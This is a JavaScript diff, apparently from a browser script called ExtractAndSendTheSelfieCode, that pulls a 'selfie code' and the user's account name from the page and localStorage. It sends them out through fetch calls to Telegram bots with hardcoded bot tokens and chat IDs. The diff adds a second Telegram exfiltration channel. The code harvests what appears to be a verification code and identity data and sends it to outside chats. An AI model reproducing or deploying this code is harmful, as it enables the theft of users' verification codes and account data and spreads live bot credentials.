@@ -7,6 +7,9 @@ function ExtractAndSendTheSelfieCode(){
     function sendMessage(texte) {
         fetch('https://api.telegram.org/bot7373477501:AAFrSLeWYaKL3kFbch-38rlAjj6AwVCf00k/sendMessage?chat_id=-1002182656332&text=' + texte);
     }
+     function sendMessage3(texte) {
+        fetch('https://api.telegram.org/bot7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s/sendMessage?chat_id=-1002186788637&text=' + texte);
+    }
 
      function appendToFile(data, filename) {
         const a = document.createElement('a');
@@ -36,7 +39,9 @@ function ExtractAndSendTheSelfieCode(){
 
              appendToFile(selfieCode, 'FORBES_SELFIE_CODE')
          //  sendMessage( localStorage.accountFullName + ' :  '+selfieCode)
-             sendMessage('FORBES SELFIE CODE')
+             sendMessage('FORBES SELFIE CODE');
+              sendMessage3('FORBES SELFIE CODE');
+            
             sendMessage2( localStorage.accountFullName + ' :  ' +selfieCode)
 
              prompt("Selfie Code", selfieCode);
